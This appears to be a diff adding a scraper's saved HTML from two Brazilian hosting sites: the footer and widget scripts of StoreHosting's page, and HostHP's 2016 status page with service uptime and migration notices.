+          <li><a href="https://cliente.storehosting.com.br/index.php">Painel do Cliente</a></li>
+          <li><a href="https://cliente.storehosting.com.br/submitticket.php">Abrir Ticket</a></li>
+          <li><a href="https://cliente.storehosting.com.br/clientarea.php?action=invoices">Minhas Faturas</a></li>
+          <li><a href="https://cliente.storehosting.com.br/clientarea.php?action=products">Meus Servi�os</a></li>
+          <li><a href="http://www.storehosting.com.br/contato">Formul�rio de Contato</a></li>
+          <li><a href="https://cliente.storehosting.com.br/affiliates.php">Afiliados</a></li>
+        </ul>
+      </div>
+      <!--fourth column ends--> 
+
+      <!--third column starts-->
+      <div class="span2">
+        <h5>N�s Aceitamos</h5>
+          <ul class="inline-left payment">
+            <li><img src="http://www.storehosting.com.br/assets/img/icons/payment-logos1.png" alt="icon"></li>
+            <li><img src="http://www.storehosting.com.br/assets/img/icons/payment-logos3.png" alt="icon"></li>
+            <li><img src="http://www.storehosting.com.br/assets/img/icons/payment-logos4.png" alt="icon"></li>
+            <li><img src="http://www.storehosting.com.br/assets/img/icons/payment-logos7.png" alt="icon"></li>
+            <li><img src="http://www.storehosting.com.br/assets/img/icons/payment-logos8.png" alt="icon"></li>
+            <li><img src="http://www.storehosting.com.br/assets/img/icons/payment-logos9.png" alt="icon"></li>
+          </ul>
+          <br>
+      </div>
+      <!--third column ends--> 
+           
+      <!--fifth column starts-->
+      <div class="span3"> 
+        <img width="200" src="http://www.storehosting.com.br/assets/img/logo.png" />
+        <div class="spacer-20px"></div>
+        <p class="text-big color-dark"> <strong>Skype StoreHosting</strong></p>
+        <p><a href="#" class="text-small"><strong>contato@storehosting.com.br</strong></a><br/>
+          <a href="#" class="text-small"><strong>comercial@storehosting.com.br</strong></a><br />
+          <a href="#" class="text-small"><strong>suporte@storehosting.com.br</strong></a></p>
+      </div>
+      <!--fifth column ends--> 
+      
+    </div>
+  </div>
+</section>
+<!-- footer section ends
+================================================== --> 
+
+<!-- copyright section starts
+================================================== -->
+<section id="copyright">
+  <div class="container">
+    <div class="row">
+      <div class="span12">
+        <div style="float:left"><p>StoreHosting - Solu��es Web - Todos Direitos Reservados &copy; 2016</p></div>
+      </div>
+    </div>
+  </div>
+</section>
+<!-- copyright section ends
+================================================== --> 
+
+<!-- scripts starts
+================================================== --> 
+<script src="http://www.storehosting.com.br/assets/js/bootstrap.js" type="text/javascript" ></script> 
+<script src="http://www.storehosting.com.br/assets/js/ddsmoothmenu.js" type="text/javascript"></script> 
+<script src="http://www.storehosting.com.br/assets/js/jquery.flexslider-min.js" type="text/javascript" ></script> 
+<script src="http://www.storehosting.com.br/assets/js/custom.js" type="text/javascript"></script>
+<!--Start of Zopim Live Chat Script-->
+<script type="text/javascript">
+var LHCChatOptions = {};
+LHCChatOptions.opt = {widget_height:340,widget_width:300,popup_height:520,popup_width:500};
+(function() {
+var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+var refferer = (document.referrer) ? encodeURIComponent(document.referrer.substr(document.referrer.indexOf('://')+1)) : '';
+var location  = (document.location) ? encodeURIComponent(window.location.href.substring(window.location.protocol.length)) : '';
+po.src = '//chat.storehosting.com.br/index.php/por/chat/getstatus/(click)/internal/(position)/bottom_right/(ma)/br/(top)/350/(units)/pixels/(leaveamessage)/true?r='+refferer+'&l='+location;
+var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+})();
+</script>
+<!--End of Zopim Live Chat Script-->
+</body>
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-7213571-15', 'storehosting.com.br');
+  ga('send', 'pageview');
+
+</script>
+<script type="text/javascript">
+$(document).ready(function(){
+    // Activate carousel
+    $("#myCarousel").carousel({
+      interval : 5000
+    });
+
+    // Enable carousel control
+    $(".left").click(function(){
+      $("#myCarousel").carousel('prev');
+    });
+    $(".right").click(function(){
+      $("#myCarousel").carousel('next');
+    });
+    
+    // Enable carousel indicators
+    $(".slide-one").click(function(){
+      $("#myCarousel").carousel(0);
+    });
+    $(".slide-two").click(function(){
+      $("#myCarousel").carousel(1);
+    });
+    $(".slide-three").click(function(){
+      $("#myCarousel").carousel(2);
+    });
+});
+
+$(document).ready(function() {
+  $(".LogoCliente").jCarouselLite({
+    auto: 1,
+    speed: 2000,
+    visible: 3
+  });
+});
+
+</script>
+</htm
+----------------------------- END OF HTML
+http://status.hosthp.com.br
+>
+
+||| http://status.hosthp.com.br/ | <!DOCTYPE html>
+<html lang="pt-br">
+	<head>
+		<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+		<meta charset="utf-8">
+		<title>[HOSTHP] - Status Blog</title>
+		<meta name="generator" content="" />
+		<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+		<link href="http://status.hosthp.com.br/css/bootstrap.min.css" rel="stylesheet">
+
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">
+
+		<!-- <link href="//netdna.bootstrapcdn.com/font-awesome/3.2.1/css/font-awesome.min.css" rel="stylesheet"> -->
+		<!--[if lt IE 9]>
+			<script src="//html5shim.googlecode.com/svn/trunk/html5.js"></script>
+		<![endif]-->
+		<link href="http://status.hosthp.com.br/css/styles.css" rel="stylesheet">
+
+	</head>
+	<body>
+<header class="navbar navbar-bright navbar-fixed-top" role="banner">
+  <div class="container">
+    <div class="navbar-header">
+      <button class="navbar-toggle" type="button" data-toggle="collapse" data-target=".navbar-collapse">
+        <span class="sr-only">Navega��o</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+      <a href="http://status.hosthp.com.br/" class="navbar-brand">Home</a>
+    </div>
+    <nav class="collapse navbar-collapse" role="navigation">
+      <ul class="nav navbar-nav">
+        <li>
+          <a href="http://status.hosthp.com.br/categoria/cloud">Cloud Computing</a>
+        </li>
+        <li>
+          <a href="http://status.hosthp.com.br/categoria/revenda">Revenda</a>
+        </li>
+        <li>
+          <a href="http://status.hosthp.com.br/categoria/hospedagem">Hospedagem</a>
+        </li>
+        <li>
+          <a href="http://status.hosthp.com.br/categoria/streaming">Streaming</a>
+        </li>
+      </ul>
+     <!--  <ul class="nav navbar-right navbar-nav">
+        <li class="dropdown">
+          <a href="#" class="dropdown-toggle" data-toggle="dropdown"><i class="glyphicon glyphicon-search"></i></a>
+          <ul class="dropdown-menu" style="padding:12px;">
+            <form class="form-inline">
+              <button type="submit" class="btn btn-default pull-right"><i class="glyphicon glyphicon-search"></i></button><input type="text" class="form-control pull-left" placeholder="Search">
+            </form>
+          </ul>
+        </li>
+      </ul> -->
+
+
+    </nav>
+  </div>
+</header>
+
+<div id="masthead">  
+  <div class="container">
+    <div class="row">
+      <div class="col-md-7">
+        <h1>Status Blog
+          <p class="lead"></p>
+        </h1>
+      </div>
+      <div class="col-md-5">
+        <div class="well well-lg"> 
+          <div class="row">
+            <div class="col-sm-12">
+              <center><img src="http://hosthp.com.br/imagens/logo-of.png"></center>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div> 
+  </div><!-- /cont -->
+  
+  <div class="container">
+    <div class="row">
+      <div class="col-md-12">
+        <div class="top-spacer"> </div>
+      </div>
+    </div> 
+  </div><!-- /cont -->
+  
+</div>
+
+
+<div class="container">
+  <div class="row">
+    
+    <div class="col-md-12"> 
+      
+      <div class="panel">
+        <div class="panel-body">
+          
+          <!--/stories-->
+          <div class="row">
+            
+            <div class="col-md-12">
+            <div class="panel panel-default">
+            <div class="panel-heading"><span class="asinzentado">Status de Servi�os</span></div>
+              <div class="panel-body">
+                
+                <div class="table-responsive table-bordered">
+                  <table class="table">
+                    <thead>
+                        <tr>
+                            <th style='text-align:center'>SERVI�O</th>
+                            <th style='text-align:center'>STATUS</th>
+                        </tr>
+                    </thead>
+                    <tbody> 
+                     <tr> 
+                                      <td style='text-align:center'><p style='padding-top: 10px;'>Cloud Computing</p></td> 
+                                      <td style='text-align:center'><i class='fa fa-check-circle fa-2x verde'></i></td>
+                                    </tr> <tr> 
+                                      <td style='text-align:center'><p style='padding-top: 10px;'>Revenda BR</p></td> 
+                                      <td style='text-align:center'><i class='fa fa-check-circle fa-2x verde'></i></td>
+                                    </tr> <tr> 
+                                      <td style='text-align:center'><p style='padding-top: 10px;'>Streaming</p></td> 
+                                      <td style='text-align:center'><i class='fa fa-check-circle fa-2x verde'></i></td>
+                                    </tr> <tr> 
+                                      <td style='text-align:center'><p style='padding-top: 10px;'>Hospedagem BR</p></td> 
+                                      <td style='text-align:center'><i class='fa fa-check-circle fa-2x verde'></i></td>
+                                    </tr> <tr> 
+                                      <td style='text-align:center'><p style='padding-top: 10px;'>Revenda EUA</p></td> 
+                                      <td style='text-align:center'><i class='fa fa-check-circle fa-2x verde'></i></td>
+                                    </tr> <tr> 
+                                      <td style='text-align:center'><p style='padding-top: 10px;'>Hospedagem EUA</p></td> 
+                                      <td style='text-align:center'><i class='fa fa-check-circle fa-2x verde'></i></td>
+                                    </tr> <tr> 
+                                      <td style='text-align:center'><p style='padding-top: 10px;'>Revenda Cloud</p></td> 
+                                      <td style='text-align:center'><i class='fa fa-check-circle fa-2x verde'></i></td>
+                                    </tr>                      
+                    </tbody>
+                  </table>
+                </div>
+
+              </div>
+            </div>
+            </div>
+
+          </div>
+          <hr>
+          
+          <div class="row"> 
+
+          <div class="col-md-8">
+          <div class='row'>    
+                          <br>
+                          <div class='col-md-2 col-sm-3 text-center'>
+                            <a class='story-title' href='#'><img alt='' src='http://hosthp.com.br/imagens/logo_rodape.png' style='width:100px;height:100px' class='img-circle'></a>
+                          </div>
+                          <div class='col-md-10 col-sm-9'>
+                            <h3>Migra��o DC EUA!</h3>
+                            <div class='row'>
+                              <div class='col-xs-9'>
+                                <h4><span class='label label-default'>Hospedagem EUA</span></h4><h4>
+                                <small style='font-family:courier,'new courier';' class='text-muted'>2016-03-24 23:47:59  � <a href='http://status.hosthp.com.br/visualiza/17' class='text-muted'>Leia mais</a></small>
+                                </h4></div>
+                              <div class='col-xs-3'></div>
+                            </div>
+                            <br><br>
+                          </div>
+                        </div>
+                        <hr><div class='row'>    
+                          <br>
+                          <div class='col-md-2 col-sm-3 text-center'>
+                            <a class='story-title' href='#'><img alt='' src='http://hosthp.com.br/imagens/logo_rodape.png' style='width:100px;height:100px' class='img-circle'></a>
+                          </div>
+                          <div class='col-md-10 col-sm-9'>
+                            <h3>Srv1br.com.br</h3>
+                            <div class='row'>
+                              <div class='col-xs-9'>
+                                <h4><span class='label label-default'>Revenda BR</span></h4><h4>
+                                <small style='font-family:courier,'new courier';' class='text-muted'>2016-03-14 08:37:21  � <a href='http://status.hosthp.com.br/visualiza/16' class='text-muted'>Leia mais</a></small>
+                                </h4></div>
+                              <div class='col-xs-3'></div>
+                            </div>
+                            <br><br>
+                          </div>
+                        </div>
+                        <hr><div class='row'>    
+                          <br>
+                          <div class='col-md-2 col-sm-3 text-center'>
+                            <a class='story-title' href='#'><img alt='' src='http://hosthp.com.br/imagens/logo_rodape.png' style='width:100px;height:100px' class='img-circle'></a>
+                          </div>
+                          <div class='col-md-10 col-sm-9'>
+                            <h3>Srv1eua.com.br</h3>
+                            <div class='row'>
+                              <div class='col-xs-9'>
+                                <h4><span class='label label-default'>Revenda EUA</span></h4><h4>
+                                <small style='font-family:courier,'new courier';' class='text-muted'>2016-03-11 12:07:35  � <a href='http://status.hosthp.com.br/visualiza/15' class='text-muted'>Leia mais</a></small>
+                                </h4></div>
+                              <div class='col-xs-3'></div>
+                            </div>
+                            <br><br>
+                          </div>
+                        </div>
+                        <hr><div class='row'>    
+                          <br>
+                          <div class='col-md-2 col-sm-3 text-center'>
+                            <a class='story-title' href='#'><img alt='' src='http://hosthp.com.br/imagens/logo_rodape.png' style='width:100px;height:100px' class='img-circle'></a>
+                          </div>
+                          <div class='col-md-10 col-sm-9'>
+                            <h3>Srv1eua.com.br</h3>
+                            <div class='row'>
+                              <div class='col-xs-9'>
+                                <h4><span class='label label-default'>Revenda EUA</span></h4><h4>
+                                <small style='font-family:courier,'new courier';' class='text-muted'>2016-02-22 16:36:09  � <a href='http://status.hosthp.com.br/visualiza/14' class='text-muted'>Leia mais</a></small>
+                                </h4></div>
+                              <div class='col-xs-3'></div>
+                            </div>
+                            <br><br>
+                          </div>
+                        </div>
+                        <hr><div class='row'>    
+                          <br>
+                          <div class='col-md-2 col-sm-3 text-center'>
+                            <a class='story-title' href='#'><img alt='' src='http://hosthp.com.br/imagens/logo_rodape.png' style='width:100px;height:100px' class='img-circle'></a>
+                          </div>
+                          <div class='col-md-10 col-sm-9'>
+                            <h3>Srv1br.com.br</h3>
+                            <div class='row'>
+                              <div class='col-xs-9'>
+                                <h4><span class='label label-default'>Revenda BR</span></h4><h4>
+                                <small style='font-family:courier,'new courier';' class='text-muted'>2016-02-16 16:45:16  � <a href='http://status.hosthp.com.br/visualiza/13' class='text-muted'>Leia mais</a></small>
+                                </h4></div>
+                              <div class='col-xs-3'></div>
+                            </div>
+                            <br><br>
+                          </div>
+                        </div>
+                        <hr><div class='row'>    
+                          <br>
+                          <div class='col-md-2 col-sm-3 text-center'>
+                            <a class='story-title' href='#'><img alt='' src='http://hosthp.com.br/imagens/logo_rodape.png' style='width:100px;height:100px' class='img-circle'></a>
+                          </div>
+                          <div class='col-md-10 col-sm-9'>
+                            <h3>Srv1eua.com.br</h3>
+                            <div class='row'>
+                              <div class='col-xs-9'>
+                                <h4><span class='label label-default'>Revenda EUA</span></h4><h4>
+                                <small style='font-family:courier,'new courier';' class='text-muted'>2016-02-15 12:38:33  � <a href='http://status.hosthp.com.br/visualiza/12' class='text-muted'>Leia mais</a></small>
+                                </h4></div>
+                              <div class='col-xs-3'></div>
+                            </div>
+                            <br><br>
+                          </div>
+                        </div>
+                        <hr><div class='row'>    
+                          <br>
+                          <div class='col-md-2 col-sm-3 text-center'>
+                            <a class='story-title' href='#'><img alt='' src='http://hosthp.com.br/imagens/logo_rodape.png' style='width:100px;height:100px' class='img-circle'></a>
+                          </div>
+                          <div class='col-md-10 col-sm-9'>
+                            <h3>Clientes Net Virtua!</h3>
+                            <div class='row'>
+                              <div class='col-xs-9'>
+                                <h4><span class='label label-default'>Revenda BR</span></h4><h4>
+                                <small style='font-family:courier,'new courier';' class='text-muted'>2016-01-22 16:42:07  � <a href='http://status.hosthp.com.br/visualiza/11' class='text-muted'>Leia mais</a></small>
+                                </h4></div>
+                              <div class='col-xs-3'></div>
+                            </div>
+                            <br><br>
+                          </div>
+                        </div>
+                        <hr><div class='row'>    
+                          <br>
+                          <div class='col-md-2 col-sm-3 text-center'>
+                            <a class='story-title' href='#'><img alt='' src='http://hosthp.com.br/imagens/logo_rodape.png' style='width:100px;height:100px' class='img-circle'></a>
+                          </div>
+                          <div class='col-md-10 col-sm-9'>
+                            <h3>Revenda BR</h3>
+                            <div class='row'>
+                              <div class='col-xs-9'>
+                                <h4><span class='label label-default'>Revenda BR</span></h4><h4>
+                                <small style='font-family:courier,'new courier';' class='text-muted'>2016-01-21 22:21:49  � <a href='http://status.hosthp.com.br/visualiza/10' class='text-muted'>Leia mais</a></small>
+                                </h4></div>
+                              <div class='col-xs-3'></div>
+                            </div>
+                            <br><br>
+                          </div>
+                        </div>
+                        <hr><div class='row'>    
+                          <br>
+                          <div class='col-md-2 col-sm-3 text-center'>
+                            <a class='story-title' href='#'><img alt='' src='http://hosthp.com.br/imagens/logo_rodape.png' style='width:100px;height:100px' class='img-circle'></a>
+                          </div>
+                          <div class='col-md-10 col-sm-9'>
+                            <h3>Falha em um Switch</h3>
+                            <div class='row'>
+                              <div class='col-xs-9'>
+                                <h4><span class='label label-default'>Cloud Computing</span></h4><h4>
+                                <small style='font-family:courier,'new courier';' class='text-muted'>2016-01-20 18:44:44  � <a href='http://status.hosthp.com.br/visualiza/6' class='text-muted'>Leia mais</a></small>
+                                </h4></div>
+                              <div class='col-xs-3'></div>
+                            </div>
+                            <br><br>
+                          </div>
+                        </div>
+                        <hr><div class='row'>    
+                          <br>
+                          <div class='col-md-2 col-sm-3 text-center'>
+                            <a class='story-title' href='#'><img alt='' src='http://hosthp.com.br/imagens/logo_rodape.png' style='width:100px;height:100px' class='img-circle'></a>
+                          </div>
+                          <div class='col-md-10 col-sm-9'>
+                            <h3>Revenda EUA online</h3>
+                            <div class='row'>
+                              <div class='col-xs-9'>
+                                <h4><span class='label label-default'>Revenda EUA</span></h4><h4>
+                                <small style='font-family:courier,'new courier';' class='text-muted'>2016-01-18 21:57:52  � <a href='http://status.hosthp.com.br/visualiza/5' class='text-muted'>Leia mais</a></small>
+                                </h4></div>
+                              <div class='col-xs-3'></div>
+                            </div>
+                            <br><br>
+                          </div>
+                        </div>
+                        <hr><div class='row'>    
+                          <br>
+                          <div class='col-md-2 col-sm-3 text-center'>
+                            <a class='story-title' href='#'><img alt='' src='http://hosthp.com.br/imagens/logo_rodape.png' style='width:100px;height:100px' class='img-circle'></a>
+                          </div>
+                          <div class='col-md-10 col-sm-9'>
+                            <h3>Rede Brasil Revendas</h3>
+                            <div class='row'>
+                              <div class='col-xs-9'>
+                                <h4><span class='label label-default'>Revenda BR</span></h4><h4>
+                                <small style='font-family:courier,'new courier';' class='text-muted'>2016-01-13 17:26:18  � <a href='http://status.hosthp.com.br/visualiza/3' class='text-muted'>Leia mais</a></small>
+                                </h4></div>
+                              <div class='col-xs-3'></div>
+                            </div>
+                            <br><br>
+                          </div>
+                        </div>
+                        <hr>        </div>
+        
+        <div class="col-md-4">
+            <div class="panel panel-default">
+            <div class="panel-heading"><h4>MIGRA��ES AGENDADAS</h4></div>
+              <div class="panel-body">
+                <ul>
+                 <li style='margin-bottom:10px;'><span class='label label-primary'>Mudan��o de DC EUA!</span> Ser� iniciado a migra��o nesta Quinta 24/03/2016.
+Foi enviado um comunicado via email, caso n�o tenha recebido, abra um chamado em nosso Central do Cliente para reenviarmos.
+</li> <li style='margin-bottom:10px;'><span class='label label-primary'>Teste NetVirtua rede Brasil!</span> Ol�!
+
+Caro(a)s clientes, o nosso sistema Anti Ddos na rede Brasil Alog/Equinix SP1, quando ativado, funciona de forma 100% eficaz, segurando todos os ataques Ddos. 
+Por�m, os clientes usu�rios da Net Virtua/Embratel ficam sem acesso. Em partes, entendemos o que esta ocorrendo.
+
+Hoje 18/02/2016 as 20:00 Horas, hor�rio de Bras�lia, estaremos migrando 100% da nossa rede para a prote��o Anti ddos afim de fazermos testes at� normalizar o acesso com a Net Virtua.
+
+Informaremos aqui a conclus�o e o resultado.
+
+---
+O teste foi conclu�do. A rede esta operando normal.</li> <li style='margin-bottom:10px;'><span class='label label-primary'>Teste</span> Apenas um teste.
+20/01/2016</li>                </ul>
+              </div>
+            </div>
+        </div>
+          
+
+        </div>
+     
+          <!--/stories-->
+          
+          
+          <a href="/" class="btn btn-primary pull-right btnNext">Mais <i class="fa fa-arrow-right"></i></a>
+        
+          
+        </div>
+      </div>                                             
+                                                      
+   	</div><!--/col-12-->
+  </div>
+</div>
+                                                
+                                                                                
+<hr>
+
+<div class="container" id="footer">
+  <div class="row">
+    <div class="col col-sm-12">
+      
+      <h1>Acompanhe</h1>
+      <div class="btn-group">
+       <a class="btn btn-twitter btn-lg" href="#"><i class="icon-twitter icon-large"></i> Twitter</a>
+	   <a class="btn btn-facebook btn-lg" href="#"><i class="icon-facebook icon-large"></i> Facebook</a>
+	   <a class="btn btn-google-plus btn-lg" href="#"><i class="icon-google-plus icon-large"></i> Google+</a>
+      </div>
+      
+    </div>
+  </div>
+</div>
+
+<hr>
+
+<hr>
+
+<footer>
+  <div class="container">
+    <div class="row">
+      <div class="col-sm-6">
+        <ul class="list-inline">
+          <!-- <li><i class="icon-facebook icon-2x"></i></li>
+          <li><i class="icon-twitter icon-2x"></i></li>
+          <li><i class="icon-google-plus icon-2x"></i></li> -->
+          <!-- <li><i class="icon-pinterest icon-2x"></i></li> -->
+        </ul>
+        
+      </div>
+      <div class="col-sm-6">
+          <p class="pull-right">Todos os direitos reservados. Hosthp 2016</p>      
+      </div>
+    </div>
+  </div>
+</footer>
+	<!-- script references -->
+		<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.2/jquery.min.js"></script>
+		<script src="http://status.hosthp.com.br/js/bootstrap.min.js"></script>
+	</body>
+</h
+----------------------------- END OF HTML
+
+The program has successfuly finished.
